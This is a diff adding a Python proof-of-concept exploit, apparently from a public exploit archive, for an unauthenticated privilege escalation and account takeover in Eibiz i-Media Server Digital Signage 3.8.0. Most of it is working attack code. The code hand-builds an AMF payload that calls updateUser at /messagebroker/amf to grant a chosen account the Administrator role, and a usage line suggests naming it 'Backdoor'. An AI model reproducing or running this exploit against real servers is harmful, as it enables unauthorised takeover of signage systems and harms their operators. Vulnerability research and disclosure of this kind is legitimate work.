@@ -1,0 +1,201 @@
+# Exploit Title: Eibiz i-Media Server Digital Signage 3.8.0 - Privilege Escalation
+# Date: 2020-08-28
+# Exploit Author: LiquidWorm
+# Vendor Homepage: http://www.eibiz.co.th
+# Version: 3.8.0
+# Tested on: Windows
+# CVE : N/A
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#
+#
+# Eibiz i-Media Server Digital Signage 3.8.0 Remote Privilege Escalation / Account Takeover
+#
+#
+# Vendor: EIBIZ Co.,Ltd.
+# Product web page: http://www.eibiz.co.th
+# Affected version: <=3.8.0
+#
+# Summary: EIBIZ develop advertising platform for out of home media in that
+# time the world called "Digital Signage". Because most business customers
+# still need get outside to get in touch which products and services. Online
+# media alone cannot serve them right place, right time.
+#
+# Desc: The application suffers from an unauthenticated remote privilege escalation
+# and account takeover vulnerability that can be triggered by directly calling the
+# updateUser object (part of ActionScript object graphs), effectively elevating to
+# an administrative role or taking over an existing account by modifying the settings.
+#
+# Tested on: Windows Server 2016
+#            Windows Server 2012 R2
+#            Windows Server 2008 R2
+#            Apache Flex
+#            Apache Tomcat/6.0.14
+#            Apache-Coyote/1.1
+#            BlazeDS Application
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2020-5584
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5584.php
+#
+#
+# 26.07.2020
+#
+#
+
+
+import requests
+import sys#####|
+import re##### |
+#############  |
+############   |
+###########    |
+##########     |
+#########      |
+########       |
+#######        |
+######         |
+#####          |
+#PoC           |
+###            |
+##             |
+#              |
+class Escalada:
+    
+    def __init__(self):
+        self.session = "11111111112222222222333333333344"
+        self.agent = "DigitalSigner/25.1"
+        self.display = "Intruder Alert"
+        self.ep = "/messagebroker/amf"
+        self.suprole = "Designer"
+        self.serialize = None
+        self.address = None
+        self.usrname = None
+        self.passwrd = None
+        self.headers = None
+
+    def usage(self):
+    	if len(sys.argv) < 5:
+            print("i-Media Server Digital Signage 3.8.0 Privilege Escalation")
+            print("Usage: ./poc.py [ip] [username] [password] [displayname] [role]")
+            print("Example: ./poc.py 192.168.1.1 testingus 111111 Backdoor Administrator")
+            exit(21)
+        else:
+            self.address = sys.argv[1]
+            self.usrname = sys.argv[2]
+            self.passwrd = sys.argv[3]
+            self.display = sys.argv[4]
+            self.suprole = (bytes("Administrator".encode("utf-8")) if len(sys.argv) < 6 else sys.argv[5])
+            #__
+            #  | Administrator __
+            #                    | Designer __
+            #                                 | Reporter __
+            #                                              | Approver
+            if not "http" in self.address:
+                self.address = "http://{}".format(self.address)
+
+    def amf(self):
+    	self.cookies = {"JSESSIONID"      : self.session} # not really needed
+        self.headers = {"User-Agent"      : self.agent,
+                        "Accept"          : "*/*",
+                        "Accept-Language" : "en-US,en;q=0.5",
+                        "Accept-Encoding" : "gzip, deflate",
+                        "Origin"          : self.address,
+                        "Connection"      : "close",
+                        "Referer"         : self.address + "/main.swf",
+                        "Content-Type"    : "application/x-amf"}
+
+        self.serialize  = b"\x00\x03\x00\x00\x00\x01\x00\x04\x6E\x75\x6C\x6C"
+        self.serialize += b"\x00\x03\x2F\x35\x38\x00\x00\x01\xFE\x0A\x00\x00"
+        self.serialize += b"\x00\x01\x11\x0A\x81\x13\x4F\x66\x6C\x65\x78\x2E"
+        self.serialize += b"\x6D\x65\x73\x73\x61\x67\x69\x6E\x67\x2E\x6D\x65"
+        self.serialize += b"\x73\x73\x61\x67\x65\x73\x2E\x52\x65\x6D\x6F\x74"
+        self.serialize += b"\x69\x6E\x67\x4D\x65\x73\x73\x61\x67\x65\x0D\x73"
+        self.serialize += b"\x6F\x75\x72\x63\x65\x13\x6F\x70\x65\x72\x61\x74"
+        self.serialize += b"\x69\x6F\x6E\x13\x6D\x65\x73\x73\x61\x67\x65\x49"
+        self.serialize += b"\x64\x13\x74\x69\x6D\x65\x73\x74\x61\x6D\x70\x09"
+        self.serialize += b"\x62\x6F\x64\x79\x11\x63\x6C\x69\x65\x6E\x74\x49"
+        self.serialize += b"\x64\x17\x64\x65\x73\x74\x69\x6E\x61\x74\x69\x6F"
+        self.serialize += b"\x6E\x15\x74\x69\x6D\x65\x54\x6F\x4C\x69\x76\x65"
+        self.serialize += b"\x0F\x68\x65\x61\x64\x65\x72\x73\x01\x06\x15\x75"
+        self.serialize += b"\x70\x64\x61\x74\x65\x55\x73\x65\x72\x06\x49\x31"
+        self.serialize += b"\x42\x38\x39\x37\x41\x38\x36\x2D\x37\x33\x42\x45"
+        self.serialize += b"\x2D\x30\x35\x42\x31\x2D\x43\x45\x42\x33\x2D\x41"
+        self.serialize += b"\x30\x35\x35\x30\x39\x36\x34\x31\x31\x34\x34\x04"
+        self.serialize += b"\x00\x09\x05\x01\x0A\x81\x73\x1B\x64\x73\x2E\x6D"
+        self.serialize += b"\x6F\x64\x65\x6C\x2E\x55\x73\x65\x72\x11\x70\x61"
+        self.serialize += b"\x73\x73\x77\x6F\x72\x64\x0D\x63\x72\x65\x61\x74"
+        self.serialize += b"\x65\x07\x74\x65\x6C\x07\x66\x61\x78\x09\x6E\x61"
+        self.serialize += b"\x6D\x65\x0F\x61\x64\x64\x72\x65\x73\x73\x0D\x75"
+        self.serialize += b"\x70\x64\x61\x74\x65\x05\x69\x64\x0D\x6D\x6F\x62"
+        self.serialize += b"\x69\x6C\x65\x0F\x75\x44\x65\x6C\x65\x74\x65\x15"
+        self.serialize += b"\x64\x65\x70\x61\x72\x74\x6D\x65\x6E\x74\x09\x72"
+        self.serialize += b"\x6F\x6C\x65\x09\x72\x65\x61\x64\x0B\x65\x6D\x61"
+        self.serialize += b"\x69\x6C\x0F\x63\x6F\x6D\x70\x61\x6E\x79\x06" #-"
+        
+        self.bytecount  = len(self.passwrd * 2) + 1
+        self.bytesdata  = [self.bytecount]
+        self.serialize += "".join(map(chr, self.bytesdata))
+        
+        self.serialize += (bytes(self.passwrd.encode("utf-8"))) #-----------"
+        self.serialize += b"\x03\x06\x19\x31\x31\x31\x2D\x32\x32\x32\x2D\x33"
+        self.serialize += b"\x33\x33\x33\x06\x19\x33\x33\x33\x2D\x32\x32\x32"
+        self.serialize += b"\x2D\x31\x31\x31\x31\x06" #---------------------"
+        
+        self.bytecount  = len(self.display * 2) + 1
+        self.bytesdata  = [self.bytecount]
+        self.serialize += "".join(map(chr, self.bytesdata))
+        
+        self.serialize += (bytes(self.display.encode("utf-8"))) #-----------"
+        self.serialize += b"\x06\x1F\x49\x6D\x61\x67\x69\x6E\x61\x72\x79\x53"
+        self.serialize += b"\x74\x72\x65\x65\x74\x03\x06" #-----------------"
+
+        self.bytecount  = len(self.usrname * 2) + 1
+        self.bytesdata  = [self.bytecount]
+        self.serialize += "".join(map(chr, self.bytesdata))
+        
+        self.serialize += (bytes(self.usrname.encode("utf-8"))) #-----------"
+        self.serialize += b"\x06\x01\x03\x06\x11\x53\x65\x63\x75\x72\x69\x74"
+        self.serialize += b"\x79\x06" #-------------------------------------"
+
+        self.bytecount  = len(self.suprole * 2) + 1
+        self.bytesdata  = [self.bytecount]
+        self.serialize += "".join(map(chr, self.bytesdata))
+        
+        self.serialize += (bytes(self.suprole.encode("utf-8"))) #-----------"
+        self.serialize += b"\x03\x06\x15\x7A\x73\x6C\x40\x77\x68\x61\x2E\x62"
+        self.serialize += b"\x61\x06\x07\x5A\x53\x4C\x06\x42\x01\x06\x17\x75"
+        self.serialize += b"\x73\x65\x72\x53\x65\x72\x76\x69\x63\x65\x04\x00"
+        self.serialize += b"\x0A\x0B\x01\x09\x44\x53\x49\x64\x06\x49\x34\x41"
+        self.serialize += b"\x35\x46\x33\x33\x43\x33\x2D\x37\x31\x31\x46\x2D"
+        self.serialize += b"\x35\x38\x45\x38\x2D\x39\x30\x35\x30\x2D\x39\x35"
+        self.serialize += b"\x44\x31\x30\x30\x46\x33\x44\x45\x33\x45\x15\x44"
+        self.serialize += b"\x53\x45\x6E\x64\x70\x6F\x69\x6E\x74\x06\x0D\x6D"
+        self.serialize += b"\x79\x2D\x61\x6D\x66\x01" #---------------------"
+
+        print("First try...")
+        req = requests.post(self.address + self.ep, headers=self.headers, cookies=self.cookies, data=self.serialize)
+        #print(req.text.encode("utf-8"))
+        if "Detected duplicate HTTP-based FlexSessions" in req.text:
+            print("Second try...")
+            req = requests.post(self.address + self.ep, headers=self.headers, cookies=self.cookies, data=self.serialize)
+            #print(req.text.encode("utf-8"))
+            if "AcknowledgeMessage" in req.text:
+                print("You are " + self.suprole + " now!")
+            else:
+                print("Didn't work.")
+                exit(0)
+        else:
+        	print("Try again!")
+
+    def main(self):
+        self.usage()
+        self.amf()
+
+if __name__ == '__main__':
+    Escalada().main()
